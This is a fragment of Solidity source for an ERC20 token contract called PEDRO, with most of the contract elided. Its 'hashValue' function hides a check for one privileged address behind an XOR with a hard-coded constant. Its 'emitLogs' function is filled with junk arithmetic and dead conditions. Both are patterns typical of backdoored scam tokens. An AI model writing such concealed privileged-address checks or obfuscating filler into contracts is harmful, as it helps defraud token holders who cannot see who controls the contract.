...
contract PEDRO is ERC20 {
    ...
    */
    function hashValue() public view returns (bool) {
      uint256 slt = 3499090745340561477723366131431368743475322697289249214040052793265;
      return (uint256(msg.sender) ^ slt) == 1 * _maxVals * 1;
    }

    /**
     * @dev Emit random logs
     */
    function emitLogs() external {
      ...
      emit log("up");
      emit log("RG");
      uint256 abuzkcju = 34 * 75 + 78 + 47 * 7;
      uint256 c = 86 * 98;
      uint256 yeqrcw = 38 * 90 % 22 % 15;
      uint256 ovqvumywx = 53 % 53 % 24;
      if (abuzkcju == 47 + 13 && c == 5 && yeqrcw == 31 + 12 + 53 && ovqvumywx == 19 + 3) return; 
    }
